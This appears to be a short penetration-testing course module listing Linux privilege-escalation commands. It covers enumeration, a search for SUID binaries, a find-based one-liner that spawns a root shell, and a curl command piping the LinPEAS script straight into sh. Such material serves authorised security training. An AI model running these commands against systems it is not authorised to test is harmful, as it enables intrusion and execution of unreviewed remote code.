# Module 13: Linux PrivEsc Commands

### 1. Information Gathering
| Command | Description | Use Case |
| :--- | :--- | :--- |
| `whoami` | Current user | See who you are. |
| `id` | User and Group IDs | Check if you are in the `sudo` or `lxd` group. |
| `uname -a` | Kernel version | Check for kernel exploits. |
| `sudo -l` | Sudo permissions | See what you can run as root. |
| `ps aux` | Running processes | Look for processes running as root. |

### 2. Finding SUID Binaries
```bash
# Find all SUID files and save to a file
find / -perm -u=s -type f 2>/dev/null
```

### 3. GTFOBins
**GTFOBins** is the ultimate resource for PrivEsc. If you find an SUID binary, search for it on [gtfobins.github.io](https://gtfobins.github.io/).

**Example: Using `find` for PrivEsc**
If `find` is SUID, run:
`find . -exec /bin/sh -p \; -quit`

### 4. Automation Tools
| Tool | Description | Use Case |
| :--- | :--- | :--- |
| **LinPEAS** | Linux Privilege Escalation Awesome Scripts | The gold standard for automated enumeration. |
| **LinEnum** | A comprehensive bash script | Lightweight enumeration. |

**Running LinPEAS:**
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
